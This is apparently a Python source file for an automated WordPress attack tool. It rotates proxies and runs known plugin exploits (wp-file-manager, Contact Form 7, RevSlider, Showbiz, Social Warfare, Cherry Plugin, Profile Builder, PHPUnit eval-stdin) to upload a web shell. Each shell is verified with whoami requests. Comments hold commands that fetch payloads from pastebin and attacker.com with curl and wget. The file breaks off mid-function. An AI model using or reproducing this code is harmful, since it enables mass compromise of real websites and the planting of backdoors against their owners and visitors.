import importlib
import re
import argparse
import os
import sys 
import time
import json 
import requests 
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from threading import Lock
from datetime import datetime
import requests
from pathlib import Path
import itertools

from asciimatics.renderers import Fire, ImageFile
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.effects import Print
from asciimatics.exceptions import ResizeScreenError
# from colorama import init, Fore

locker = Lock()

Modules_CMS, Core_Helper, LFI_Scanner, Shell_Inj, pManager, PMA, CProxies, Infom_Tables, UI_SetupConfig = (
    importlib.import_module('Core.CMS_ID'),
    importlib.import_module('Core.Core_Helper'),
    importlib.import_module('Core.LFI_Scanner'),
    importlib.import_module('Core.Shell_Loader'),
    importlib.import_module('Core.Plugin_Manager'),
    importlib.import_module('Core.PHPMyAdmin'),
    importlib.import_module('Core.Dynamic_Proxies'),
    importlib.import_module('Core.Infom_Helper'),
    importlib.import_module('Core.UI_Settings')
)


def Generate_ResultFolder():
    try:
        os.makedirs("DB_Results", exist_ok=True) 
    except:
        pass 
    try:
        os.makedirs(r"DB_Results\Domain_Technology", exist_ok=True) 
    except:
        pass 
Generate_ResultFolder()



RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

NO_USED = None



with open(r"Config\config.json", "r") as f:
    config_json = json.load(f)

# CFG_DETECT_MULTI_CMS = config_json['TECHNOLOGY']['Detect_All_CMS']

CFG_DETECT_MULTI_CMS = NO_USED
CFG_LFI_SCANNER = config_json['TECHNOLOGY']['LFI_Scanner']
CFG_PLUGIN_OFFON = config_json['TECHNOLOGY']['Plugin_Exploiter']  
CFG_WP_PHPUNIT = config_json['TECHNOLOGY']['WP_PHPUnit']
CFG_CVE_EXPLOITER = config_json['TECHNOLOGY']['CVE_Exploiter']
CFG_PHPMYADMIN_CHECKER = config_json['TECHNOLOGY']['PhpMyAdmin']

CUSTOM_DEVICE = config_json['Core']['userAgent']
MAX_THREADS = config_json['Core']['maxThreads']


CFG_PROXIES_OFFON = config_json['TECHNOLOGY']['Proxies'] #OFF OR ON WITH PROXY
 
CFG_TEST_URL = config_json['Proxy_Config']['TEST_URL']
CFG_TEST_KEY = config_json['Proxy_Config']['TEST_KEY']
PROXY_THREADS = config_json['Proxy_Config']['THREADS']
PROXY_RETRY = config_json['Proxy_Config']['RETRY']
PROXY_TIMEOUT = config_json['Proxy_Config']['TIMEOUT']


CFG_RFI_WEBSHELL = config_json['URLs']['RFI_WebShell'] # https://pastebin.com/raw/pKYszf11
CFG_HOSTSHELL = config_json['URLs']['HOST_WebShell']


CFG_TECH_WORDPRESS = config_json['TECHNOLOGY']['WordPress']
CFG_TECH_WPXMLRPC = config_json['TECHNOLOGY']['WP_XMLRPC Brute']

CFG_TECH_LARAVEL = config_json['TECHNOLOGY']['Laravel']
CFG_TECH_JOOMLA = config_json['TECHNOLOGY']['Joomla']
CFG_TECH_JOOMLABRUTE = config_json['TECHNOLOGY']['Joomla Brute']
CFG_TECH_GIT_CONFIG = config_json['TECHNOLOGY']['Git_Config']
CFG_TECH_PHP = config_json['TECHNOLOGY']['PHP']

ONLY_WORDPRESS = (
    (CFG_TECH_WORDPRESS or CFG_TECH_WPXMLRPC)
    and not (CFG_TECH_LARAVEL or CFG_TECH_JOOMLA or CFG_TECH_JOOMLABRUTE or CFG_TECH_GIT_CONFIG or CFG_TECH_PHP)
)

if ONLY_WORDPRESS:
    CFG_DETECT_MULTI_CMS = False
else:
    CFG_DETECT_MULTI_CMS = True


if (
    CFG_TECH_LARAVEL or
    CFG_TECH_JOOMLA or
    CFG_TECH_JOOMLABRUTE or
    CFG_TECH_GIT_CONFIG or
    CFG_TECH_PHP
):
    CFG_DETECT_MULTI_CMS = True

PLUGIN_CONTROL_SYSTEM = {
    'C_WordPress': CFG_TECH_WORDPRESS,
    'C_WP_XMLRPC Brute': CFG_TECH_WPXMLRPC,
    'C_Laravel': CFG_TECH_LARAVEL,
    'C_Joomla': CFG_TECH_JOOMLA,
    'C_Joomla Brute': CFG_TECH_JOOMLABRUTE,
    'C_Git_Config': CFG_TECH_GIT_CONFIG,
    'C_PHP': CFG_TECH_PHP,
}


Plugin_Manager = pManager.PluginManager(plugin_folder='Plugins_Exploiter', cfg_plugin='.py')

Config_UA = Core_Helper.DeviceAgent_mapper[CUSTOM_DEVICE] 

PHPUnit_XML = open(r'Config/PHPUnit_WP.txt', 'r').read().splitlines()

ListWP_Vuln = open(r'Config/WP_Config.txt', 'r').read().splitlines()


#Proxy_INF 
HQ_PROXIES = []
BAD_PROXIES = []
MARK_GOOD = set()
MARK_BAD = set()

# Config
checker = CProxies.ProxyChecker(
    tgt_url=CFG_TEST_URL,
    tgt_keyword=CFG_TEST_KEY,
    timeout=PROXY_TIMEOUT,
    max_retry=PROXY_RETRY,
    tgt_good_proxies=HQ_PROXIES,
    tgt_bad_proxies=BAD_PROXIES,
    tgt_mark_good=MARK_GOOD,
    tgt_mark_bad=MARK_BAD,
    max_tasker=PROXY_THREADS,
)


def Intro_BannerEffect(screen):
    ROOT_DIR = Path(__file__).resolve().parent / 'Files_BurnWP' / 'wordpress.png'

    image_height = screen.height // 2
    fire_y = image_height + 2

    image_effect = Print(
        screen,
        ImageFile(ROOT_DIR, image_height, colours=screen.colours),
        y=2,
        start_frame=0,
        stop_frame=30
    )

    fire_effect = Print(
        screen,
        Fire(screen.height - fire_y, screen.width, "*" * screen.width, 0.4, 60, screen.colours),
        y=fire_y,
        speed=1,
        transparent=False
    )

    effects = [image_effect, fire_effect]
    scene = Scene(effects, duration=150 // 2 )
    screen.play([scene], repeat=False)

def Banner_System(screen):
    Intro_BannerEffect(screen)

def Burnning(Screen):
    while True:
        try:
            Screen.wrapper(Banner_System)
            
            break
        except ResizeScreenError:
            pass
        except:
            Infom_Tables.About_US()



def Rotate_Proxies(proxy_cycles):
    if proxy_cycles:
        proxy = next(proxy_cycles)
        return {"http": proxy, "https": proxy}
    return None

# checker.MAN_THREADER()

# print(f"\n{GREEN}Finished! Good: {RESET}{len(HQ_PROXIES)}")
# print(f"{RED}Bad: {RESET}{len(BAD_PROXIES)}")

#__init__(self, plugin_folder=NO_USED, cfg_plugin=NO_USED, domain=None, WPNonce=None, Proxies_ON=None, Sess=None):
#Plugin_Manager = pManager.PluginManager(plugin_folder="plugins", cfg_plugin='.py')





def Saved_Result(filename, value):
    with locker:
        with open(filename, "a", encoding="utf-8") as f:
            f.write(value)



def Phpunit_Name(value):
    patterns = [
        r'wp-content/plugins/([^/]+)/',         
        r'wp-content/uploads/([^/]+)/',    
        r'wp-content/themes/([^/]+)/',             
        r'plugins-([^/]+)/vendor/'
    ]   

    for pattern in patterns:
        match = re.search(pattern, value)
        if match:
            return match.group(1)  
        
    return value 

def PHPUNIT_EXPLOIT(timeout, Proxies_, data, shellname):
    #print(data) {'vuln': 'http://localhost/wordpress6/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/build.xml', 'domain': 'http://localhost/wordpress6', 'resp': <Response [200]>, 'status': 200}
    #Compare /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php, 
    #Compare2 /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php b1oth are popular but last one not 
    #Compare3 /Util/PHP/Template/eval-stdin.php #NOT Much Rate Range 10-20% 
    
    #print(data['vuln']) #'taskname="phpunit"' 
    #START INJECT SHELL PHPUNIT 
    PHPUNIT_PAYLOAD1 = data['vuln'].replace('/build.xml', '/src/Util/PHP/eval-stdin.php') 
    PHPUNIT_PAYLOAD2 = data['vuln'].replace('/build.xml', '/Util/PHP/eval-stdin.php') 

    
    #http://localhost/wordpress6/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

    #Payload DIR : http://localhost/wordpress6/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
    #http://localhost/wordpress6/wp-content/plugins/cloudflare/vendor/phpunit/phpunit/
    #print(Domain_VULN)
    FULLNAME_SHELL = f'{shellname}?whoami=@1337'
    INJ_METHOD = Shell_Inj.Generate_EVIL(
                                    METHOD_PAYLOAD=Shell_Inj.METHODS[0], 
                                    URL_SHELL="https://pastebin.com/raw/0xg3wt8U", 
                                    FILENAME_SHELL=shellname,
                                    ).Shell_Generated()
    
    #error_log.php?whoami=@1337
    for path_vuln in [PHPUNIT_PAYLOAD1.strip(), PHPUNIT_PAYLOAD2.strip()]:
        DATA_INJECTION =  Core_Helper.Threaded_GET(
                                                            path_vuln, 
                                                            NO_USED, 
                                                            10, 
                                                            Config_UA, 
                                                            INJ_METHOD,  ##INJ_METHOD = '<?php system("curl -O https://pastebin.com/raw/i3pZKFMG"); system("move i3pZKFMG error_log.php"); ?>' #replace when test done because mv (linux) to move (win)
                                                            NO_USED,
                                                            False,
                                                            'req_postdata',
                                                            Proxies_,
                                                            NO_USED)
    
                                
        PHPUNIT_RES = DATA_INJECTION.run()
        for k in PHPUNIT_RES:
            data = PHPUNIT_RES[k]
            if not data['resp']: 
                continue

            DomainLink_Shell = path_vuln.replace('eval-stdin.php', FULLNAME_SHELL).strip() 
            if Core_Helper.Func_ValidShell(timeout, Proxies_, DomainLink_Shell, Config_UA):
                return True, DomainLink_Shell
                            
    return False, False



########### PROXY SYSTEM


    # end_time = time.time()  # End timer
    # total_time = end_time - start_time
    
    # print("All Proxies Task are finished. ThreadPool shutdown.")
    # minutes = int(total_time // 60)
    # seconds = total_time % 60
    # print(f"Total time taken: {minutes} minutes and {seconds:.2f} seconds")    
    


#Test Total time taken: 12 minutes and 9.27 seconds with max_worker=30 
#Test Total time taken: 3 minutes and 44.76 seconds with max_worker=100  
#Test Total time taken: 5 minutes and 45.70 seconds with max_worker=64   
#Test Total time taken: 2 minutes and 25.98 seconds with max_worker=160 
#####################################################################################


class CVE_Exploiter:
    
    def __init__(self, Target, TGT_Proxies=NO_USED, WPSec_=NO_USED, User_Agent=NO_USED, CMS_Checked=NO_USED): #None 


        self.TARGET = Target
        
        self.WPNonce_Security = WPSec_
        
        self.Proxies_ON = {"http": TGT_Proxies, "https": TGT_Proxies} if TGT_Proxies else None
        #print(self.Proxies_ON) Will be None if not enable proxy or use proxy 
        self.SET_Timeout = 15 if self.Proxies_ON else 10 #prevent proxy timeout or slow and proxy free
        self.Sessions = requests.Session()
        self.Config_UA = User_Agent
        self.WHOYOURCMS = CMS_Checked


   
    def Exploit_TASK(self):
 
        if self.WHOYOURCMS == 'WORDPRESS':
            try:
                    
                # WPNONCE_GRABBER = Core_Helper.Threaded_GET(
                #                                             self.TARGET, 
                #                                             NO_USED, 
                #                                             self.SET_Timeout, 
                #                                             Config_UA,
                #                                             NO_USED,
                #                                             NO_USED,
                #                                             NO_USED,
                #                                             'req_get',
                #                                             self.Proxies_ON,
                #                                             NO_USED)
                #
                # RUNNER_WPNonce = WPNONCE_GRABBER.run()
                # WPNonce_REZ = [RUNNER_WPNonce[i] for i in RUNNER_WPNonce][0]
                # for i in WPNonce_REZ:
                #     data = WPNonce_REZ[i]
                #    if 'resp' in data:
                # if WPNonce_REZ['resp']:
                #     WPNonce_Found = Core_Helper.Extract_WPNonce(WPNonce_REZ['resp'].text)
                #     if WPNonce_Found:
                #         wpsecurity_code = WPNonce_Found

                ########    ContactForm7_DND CVE-2020-12800      ############

                CONTACTFORM7DND_SHELL = Core_Helper.Threaded_POST(
                                                            CFG_DOMAIN=self.TARGET, 
                                                            CFG_VULN='wp-admin/admin-ajax.php', 
                                                            CFG_TIMEOUT=self.SET_Timeout, 
                                                            CFG_USERAGENT=self.Config_UA,
                                                            CFG_DATA= {
                                                            "action": "dnd_codedropz_upload",
                                                            "security": self.WPNonce_Security,
                                                            "supported_type": "php%"
                                                            },
                                                            #'upload[]': 'Files_BurnWP/hacked.txt'
                                                            CFG_FILE_UPLOAD= { "upload-file": 'Files_BurnWP/error_log.php' },  #KEY, File_Upload.txt
                                                            CFG_RAW_BODY=NO_USED,
                                                            CFG_DELAY_ATTACK=0.7,
                                                            CFG_MODE="multipart",
                                                            SET_REDIRECT=NO_USED) 
                
                FileManager_Exploit = Core_Helper.Threaded_POST(
                                                            CFG_DOMAIN=self.TARGET, 
                                                            CFG_VULN='wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 
                                                            CFG_TIMEOUT=self.SET_Timeout, 
                                                            CFG_USERAGENT=self.Config_UA,
                                                            CFG_DATA={
                                                                'reqid': '17457a1fe6959',
                                                                'cmd': 'upload',
                                                                'target': 'l1_Lw',
                                                                'mtime[]': '1576045135'
                                                            },
                                                            CFG_FILE_UPLOAD={'upload[]': 'Files_BurnWP/error_log.php'},  #KEY, File_Upload.txt
                                                            CFG_RAW_BODY=NO_USED,
                                                            CFG_DELAY_ATTACK=0.7,
                                                            CFG_MODE="multipart",
                                                            SET_REDIRECT=NO_USED, #Library Reqeuests will Switch ON auto by
                                                            CFG_Proxies=self.Proxies_ON,
                                                            Mem_Sess=NO_USED)
                CherryPlugin_Exploit = Core_Helper.Threaded_POST(
                                                            CFG_DOMAIN=self.TARGET, 
                                                            CFG_VULN='wp-content/plugins/cherry-plugin/admin/import-export/upload.php', 
                                                            CFG_TIMEOUT=self.SET_Timeout, 
                                                            CFG_USERAGENT=self.Config_UA,
                                                            CFG_DATA=NO_USED,   

                                                            # <form method="POST" enctype="multipart/form-data">
                                                            #     <input type="file" name="zip">
                                                            #     <button type="submit">Upload</button>
                                                            # </form>
                                                            #Wrong with file cherry plugin we use zip not type file
                                                            CFG_FILE_UPLOAD={'file': 'Files_BurnWP/error_log.php'},  #KEY, File_Upload.txt
                                                            CFG_RAW_BODY=NO_USED,
                                                            CFG_DELAY_ATTACK=0.7,
                                                            CFG_MODE="multipart",
                                                            SET_REDIRECT=NO_USED,
                                                            CFG_Proxies=self.Proxies_ON,
                                                            Mem_Sess=NO_USED)

                SocialWarfare_Check = Core_Helper.Threaded_GET(
                                                            self.TARGET, 
                                                            'wp-admin/admin-post.php?swp_debug=load_options&swp_url=', 
                                                            self.SET_Timeout, 
                                                            self.Config_UA, 
                                                            NO_USED, 
                                                            NO_USED,
                                                            NO_USED,
                                                            'req_get',
                                                            self.Proxies_ON,
                                                            NO_USED)
        

                SocialWarfare_DropShell = Core_Helper.Threaded_GET(self.TARGET, 
                                                            f'wp-admin/admin-post.php?swp_debug=load_options&swp_url={CFG_RFI_WEBSHELL}', 
                                                            self.SET_Timeout, 
                                                            self.Config_UA, 
                                                            NO_USED, 
                                                            NO_USED,
                                                            NO_USED,
                                                            'req_get',
                                                            self.Proxies_ON,
                                                            NO_USED)

                Contact_Form7 =  Core_Helper.Threaded_POST(
                                                            CFG_DOMAIN=self.TARGET, 
                                                            CFG_VULN='wp-content/plugins/contact-form-7/modules/file.php', 
                                                            CFG_TIMEOUT=self.SET_Timeout, 
                                                            CFG_USERAGENT=self.Config_UA,
                                                            CFG_DATA=NO_USED,

                                                        
                                                            CFG_FILE_UPLOAD={'zip': 'Files_BurnWP/error_log.php'},  
                                                            CFG_RAW_BODY=NO_USED,
                                                            CFG_DELAY_ATTACK=0.7,
                                                            CFG_MODE="multipart",
                                                            SET_REDIRECT=NO_USED,
                                                            CFG_Proxies=self.Proxies_ON,
                                                            Mem_Sess=NO_USED)

                Profile_builder = Core_Helper.Threaded_POST(
                                                            CFG_DOMAIN=self.TARGET, 
                                                            CFG_VULN='wp-admin/async-upload.php', 
                                                            CFG_TIMEOUT=self.SET_Timeout, 
                                                            CFG_USERAGENT=self.Config_UA,
                                                            CFG_DATA={
                                                                'wppb_upload': (None, 'true'),
                                                                'meta_name': (None, 'Files_BurnWP/error_log.php'),
                                                                '_wpnonce': (None, 'd2e2efd'),
                                                                'action': (None, 'upload-attachment'),
                                                                'async-upload': ('Files_BurnWP/error_log.php', open('Files_BurnWP/error_log.php', 'rb'), 'text/x-php') #change typemine text/plain[txt] or text/x-php [php]
                                                            },

                                                        
                                                            CFG_FILE_UPLOAD=NO_USED, 
                                                            CFG_RAW_BODY=NO_USED,
                                                            CFG_DELAY_ATTACK=0.7,
                                                            CFG_MODE="uploadfile_param",
                                                            SET_REDIRECT=NO_USED,
                                                            CFG_Proxies=self.Proxies_ON,
                                                            Mem_Sess=NO_USED)


                Revslider_Shell = Core_Helper.Threaded_POST(
                                                            CFG_DOMAIN=self.TARGET,
                                                            CFG_VULN='wp-admin/admin-ajax.php', 
                                                            CFG_TIMEOUT=self.SET_Timeout, 
                                                            CFG_USERAGENT=self.Config_UA,
                                                            CFG_DATA={
                                                                'action': "revslider_ajax_action", 
                                                                'client_action': "update_plugin"
                                                                },

                                                            CFG_FILE_UPLOAD={
                                                                'update_file': 'Files_BurnWP/wpfile_uploader.zip'

                                                            },  #KEY, File_Upload.txt
                                                            CFG_RAW_BODY=NO_USED,
                                                            CFG_DELAY_ATTACK=0.7,
                                                            CFG_MODE="multipart",
                                                            SET_REDIRECT=NO_USED,
                                                            CFG_Proxies=self.Proxies_ON,
                                                            Mem_Sess=NO_USED)
                                                        
                
                Showbiz_Shell = Core_Helper.Threaded_POST(
                                                            CFG_DOMAIN=self.TARGET,
                                                            CFG_VULN='wp-admin/admin-ajax.php', 
                                                            CFG_TIMEOUT=self.SET_Timeout, 
                                                            CFG_USERAGENT=self.Config_UA,
                                                            CFG_DATA={
                                                                'action': "showbiz_ajax_action", 
                                                                'client_action': "update_plugin"
                                                                },

                                                            CFG_FILE_UPLOAD={
                                                                'update_file': 'Files_BurnWP/wpfile_uploader.zip'

                                                            },  #KEY, File_Upload.txt
                                                            CFG_RAW_BODY=NO_USED,
                                                            CFG_DELAY_ATTACK=NO_USED,
                                                            CFG_MODE="multipart",
                                                            SET_REDIRECT=NO_USED,
                                                            CFG_Proxies=self.Proxies_ON,
                                                            Mem_Sess=NO_USED)

                ########## FileManager Exploit ############
                RUNNER_FILEMANAGER = FileManager_Exploit.run()
                REZ_FILEMANAGER = [RUNNER_FILEMANAGER[i] for i in RUNNER_FILEMANAGER][0]
                
                if REZ_FILEMANAGER['resp']:
                    
                    if 'added' and 'error_log' and 'isowner' in str(REZ_FILEMANAGER['resp'].text): #Detected Locate 
                        # print(f'{self.TARGET}{Form_JSON}?whoami=@1337')
                        
                        if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.TARGET}/wp-content/plugins/wp-file-manager/lib/files/error_log.php?whoami=@1337', self.Config_UA):
                            Core_Helper.Printed_Value.Log_Success(REZ_FILEMANAGER['domain'], '[WP] File_Manager | Weclome SHELL')
                            
                    else:
                        Core_Helper.Printed_Value.Log_Fail(REZ_FILEMANAGER['domain'], f"[WP] File_Manager | Failed SHELL")
                else:
                    Core_Helper.Printed_Value.Log_Fail(REZ_FILEMANAGER['domain'], f"[WP] File_Manager | Failed")


                ########## Cherry Plugin Exploit ############
                RUNNER_CHERRYPLUGIN = CherryPlugin_Exploit.run()
                REZ_CHERRYPLUGIN = [RUNNER_CHERRYPLUGIN[i] for i in RUNNER_CHERRYPLUGIN][0]
                
                ExploitedVAlid = Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, str(REZ_CHERRYPLUGIN['vuln']).replace('upload.php', 'error_log.php?whoami=@1337'), self.Config_UA)
                if ExploitedVAlid: #print(data['vuln'])
                    #Uploaded_URL = str(data['vuln']).replace('upload.php', 'hacked.txt')
                    #print(Uploaded_URL)
                    
                    Core_Helper.Printed_Value.Log_Success(REZ_CHERRYPLUGIN['domain'], '[WP] CherryPlugin | Weclome SHELL')

                else:
                    Core_Helper.Printed_Value.Log_Fail(REZ_CHERRYPLUGIN['domain'], f"[WP] CherryPlugin | Failed SHELL")

                ############### Social Warfare Exploit ###############
                CHECKRZ_SOCIALWARFARE = SocialWarfare_Check.run()
                #REZ_SOCIALWARFARE = SocialWarfare_Exploit.run()
                VALID_SOCIALWARFARE = [CHECKRZ_SOCIALWARFARE[i] for i in CHECKRZ_SOCIALWARFARE][0]
                
                if 'nothing found' in VALID_SOCIALWARFARE['resp'].text or 'nothing found' == VALID_SOCIALWARFARE['resp'].text:
                    #Core_Helper.Printed_Value.Log_Success(data['domain'], '[WP]SocialWarfare|Weclome SHELL') #VALID STEP

                    """ # Noted : This per line method RCE drop command or drop file by second command by using requests RCE ( Remote Execute Command )

                    <pre>system('whoami')</pre> 

                    <pre>system('wget http://attacker.com/payloads/shell.php -O shell.php')</pre> 

                """
                    RUNNER_SOCIALWARFARE = SocialWarfare_DropShell.run()
                    DROPSHELL_SOCIALWARFARE = [RUNNER_SOCIALWARFARE[i] for i in RUNNER_SOCIALWARFARE][0]
                
        
                    if DROPSHELL_SOCIALWARFARE['resp']:
                        if 'No changes made' in str(DROPSHELL_SOCIALWARFARE['resp'].text):
                            #print(str(data['domain'])) http://localhost/wordpress4
                            SW_Link = str(DROPSHELL_SOCIALWARFARE['domain']) + '/wp-admin/error_log.php?whoami=@1337'
                            if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, SW_Link, self.Config_UA): 
                                Core_Helper.Printed_Value.Log_Success(DROPSHELL_SOCIALWARFARE['domain'], f'[WP] SocialWarfare | Weclome SHELL')
                            
                            else:
                                Core_Helper.Printed_Value.Log_Success(DROPSHELL_SOCIALWARFARE['domain'], f'[WP] SocialWarfare | Faile​d ​​SHELL')
                    else:
                    
                        Core_Helper.Printed_Value.Log_Fail(DROPSHELL_SOCIALWARFARE['domain'], f"[WP] SocialWarfare | Failed")
                else:
                    Core_Helper.Printed_Value.Log_Fail(VALID_SOCIALWARFARE['domain'], f"[WP] SocialWarfare | Failed")

                ########    ContactForm7_DND CVE-2020-12800      ############
                
                Runner__CF7 = CONTACTFORM7DND_SHELL.run()
                CF7_REZ = [Runner__CF7[i] for i in Runner__CF7][0]
                
                if CF7_REZ['resp']:
                    try:
                        resp_json = CF7_REZ['resp'].json()
                        #print(resp_json)
                    except ValueError:
                        resp_json = None
                    if resp_json:
                        #print(str(resp_json['success']), resp_json['data']['url']) ==> True http://localhost/wordpress6/wp-content/uploads/wp_dndcf7_uploads/hacked.txt
                        if 'success' in resp_json['success'] or 'url' in str(resp_json):
                            if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.TARGET}/wp-content/uploads/wp_dndcf7_uploads/error_log.php?whoami=@1337', self.Config_UA): 
                                Core_Helper.Printed_Value.Log_Success(CF7_REZ['domain'], f'[WP] ContactForm7_DND | Weclome SHELL') 
                        else:
                            Core_Helper.Printed_Value.Log_Fail(CF7_REZ['domain'], f"[WP] ContactForm7_DND | Failed SHELL")
                    else:
                        Core_Helper.Printed_Value.Log_Fail(CF7_REZ['domain'], f"[WP] ContactForm7_DND | Failed")
                else:
                    Core_Helper.Printed_Value.Log_Fail(CF7_REZ['domain'], f"[WP] ContactForm7_DND | Failed")
                
                ########       ContactForm7 5.1.6 - Remote File Upload (RFU)     ############

                RUNNER_CONTACTFORM7 = Contact_Form7.run()
                REZ_CONTACTFORM7 = [RUNNER_CONTACTFORM7[i] for i in RUNNER_CONTACTFORM7][0]
            
                if REZ_CONTACTFORM7['resp']:
                    try:
                        resp_json = REZ_CONTACTFORM7['resp'].json()
                    except ValueError:
                        resp_json = None
                    if resp_json:
                        #print(str(resp_json['success']), resp_json['data']['url']) ==> True http://localhost/wordpress6/wp-content/plugins/contact-form-7//hacked.txt
                        if 'success' in str(resp_json['success']) or 'url' in str(resp_json):
                            if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.TARGET}/wp-content/plugins/contact-form-7/error_log.php?whoami=@1337', self.Config_UA): 
                                Core_Helper.Printed_Value.Log_Success(REZ_CONTACTFORM7['domain'], f'[WP] ContactForm7_RFU | Weclome SHELL') 
                            
                        else:
                            Core_Helper.Printed_Value.Log_Fail(REZ_CONTACTFORM7['domain'], f"[WP] ContactForm7_RFU | Failed SHELL") 
                    else:
                        Core_Helper.Printed_Value.Log_Fail(REZ_CONTACTFORM7['domain'], f"[WP] ContactForm7_RFU | Failed") 
                else:
                    Core_Helper.Printed_Value.Log_Fail(REZ_CONTACTFORM7['domain'], f"[WP] ContactForm7_RFU | Failed") 

                ########       User_Profile Builder 3.11.7 - Remote File Upload (RFU)     ############ 
                
                RUNNER_PROFILEBUILDER = Profile_builder.run()
                REZ_PROFILEBUILDER = [RUNNER_PROFILEBUILDER[i] for i in RUNNER_PROFILEBUILDER][0]
                #print(str(resp_json['success']), resp_json['data']['url']) reshell ==> http:\/\/localhost\/wordpress6\/wp-content\/uploads\/2025\/04\/test.jpg
                if REZ_PROFILEBUILDER['resp']:

                    if 'success' in str(REZ_PROFILEBUILDER['resp'].text):
                        if 'url' and 'filename' and 'editLink' in str(REZ_PROFILEBUILDER['resp'].text):
                            if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.TARGET}/wp-content/uploads/{datetime.now().year}/{datetime.now().strftime('%m')}"/error_log.php?whoami=@1337', self.Config_UA): 
                                Core_Helper.Printed_Value.Log_Success(REZ_PROFILEBUILDER['domain'], f'[WP] UserProfile_Builder | Weclome SHELL') 
                        else:
                            Core_Helper.Printed_Value.Log_Success(REZ_PROFILEBUILDER['domain'], f'[WP] UserProfile_Builder | Failed SHELL') 
                    else:
                        Core_Helper.Printed_Value.Log_Fail(REZ_PROFILEBUILDER['domain'], f"[WP] UserProfile_Builder | Failed") 
                else:
                    Core_Helper.Printed_Value.Log_Fail(REZ_PROFILEBUILDER['domain'], f"[WP] UserProfile_Builder | Failed") 

                ########       Slider Revolution Shell Upload - CVE_2014_9735    ############  
                RUNNER_POSTSHELL = Revslider_Shell.run()
                REZ_POSTSHELL = [RUNNER_POSTSHELL[i] for i in RUNNER_POSTSHELL][0]
            
                if REZ_POSTSHELL['resp']:
                    #print(REZ_POSTSHELL['resp'].text) #Success will print Upload and extraction complete. and failed =>  Failed to open ZIP file. check your file to upload with zip correctly please 
                    if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.TARGET}/wp-content/plugins/revslider/temp/update_extract/error_log.php?whoami=@1337', self.Config_UA): #Valid your own filename of zip 
                        Core_Helper.Printed_Value.Log_Success(REZ_POSTSHELL['domain'], f'[WP] Slider Revolution | Weclome SHELL') 
                    else:
                        Core_Helper.Printed_Value.Log_Fail(REZ_POSTSHELL['domain'], f"[WP] Slider Revolution | Failed SHELL") 
                else:
                    Core_Helper.Printed_Value.Log_Fail(REZ_POSTSHELL['domain'], f"[WP] Slider Revolution | Failed") 

                RUNNER_SHOWBIZ = Showbiz_Shell.run()    
                REZ_SHOWBIZ = [RUNNER_SHOWBIZ[i] for i in RUNNER_SHOWBIZ][0]
                if REZ_SHOWBIZ['resp']:
                    if Core_Helper.Func_ValidShell(self.SET_Timeout, self.Proxies_ON, f'{self.TARGET}/wp-content/plugins/showbiz/temp/update_extract/error_log.php?whoami=@1337', self.Config_UA):
                        Core_Helper.Printed_Value.Log_Success(REZ_SHOWBIZ['domain'], f'[WP] Showbiz Pro | Weclome SHELL') 
                    else:
                        Core_Helper.Printed_Value.Log_Fail(REZ_SHOWBIZ['domain'], f"[WP] Showbiz Pro | Failed SHELL") 
                else:
                    Core_Helper.Printed_Value.Log_Fail(REZ_SHOWBIZ['domain'], f"[WP] Showbiz Pro | Failed") 

                if CFG_WP_PHPUNIT:
                    for path in PHPUnit_XML:
                        WPlugin_PHPUnit_Lists = Core_Helper.Threaded_GET(
                            self.TARGET, 
                            path, 
                            self.SET_Timeout, 
                            self.Config_UA, 
                            NO_USED, 
                            NO_USED,
                            NO_USED,
                            'req_get',
                            self.Proxies_ON,
                            NO_USED
                        )
                        RUNNER__WPUnit = WPlugin_PHPUnit_Lists.run()
                        EXPLOIT_WPUNIT = [RUNNER__WPUnit[i] for i in RUNNER__WPUnit][0]
                        
                        if EXPLOIT_WPUNIT['resp']:
                            if 'composer.' in EXPLOIT_WPUNIT['resp'].text or \
                                    'taskname="phpunit' in EXPLOIT_WPUNIT['resp'].text or \
                                        '<?xml version="1.0' in EXPLOIT_WPUNIT['resp'].text:
                                #I'm sure Composer detection is wrong by about 30%-50%, but we can still inject after that and increase the success rate to get a shell with a higher percentage — it just takes time. <3
                                Work_or_Not,\
                                    Link_Shell = PHPUNIT_EXPLOIT(self.SET_Timeout, self.Proxies_ON, EXPLOIT_WPUNIT, 'error_log.php')
                                if Work_or_Not and Link_Shell:
                                    uvuvwevwevwe_onyetenyevwe_ugwemubwem_ossas = Phpunit_Name(Link_Shell)
                                    #Saver HERE
                                    Core_Helper.Printed_Value.Log_Success(EXPLOIT_WPUNIT['domain'], f"[PHPUnit] {uvuvwevwevwe_onyetenyevwe_ugwemubwem_ossas} | Weclome SHELL") 
                                else:
                                    Core_Helper.Printed_Value.Log_Fail(EXPLOIT_WPUNIT['domain'], f"[PHPUnit] {Phpunit_Name(path)} | Failed SHELL") 
                        else:
                            Core_Helper.Printed_Value.Log_Fail(EXPLOIT_WPUNIT['domain'], f"[PHPUnit] {Phpunit_Name(path)} | Failed") 
                #return

            except:pass# Exception as e:
                #Core_Helper.Printed_Value.Log_Error("Error Exploit_Task Function", str(e))

        return

class Plugin_Exploiter():
    def __init__(self, Target, Proxies=NO_USED, WPSec_=NO_USED, UserAgent=NO_USED, CFG_Settings=NO_USED, CHECKED_CMS=NO_USED): #None 
        self.TARGET = Target
        self.WPNonce = WPSec_
        self.Proxies_ON = {'http': Proxies, 'https': Proxies} if Proxies else None
        self.SET_Timeout = 15 if self.Proxies_ON else 10
        self.Sessions = requests.Session()
        self.UA_ = UserAgent
        self.PLUGIN_CONTROL_SYSTEM = CFG_Settings
        self.FOUND_CMS = CHECKED_CMS    

    def External_Plugin(self):
        
        try:
        
            Plugin_Manager.Persistenced_Plugin()  
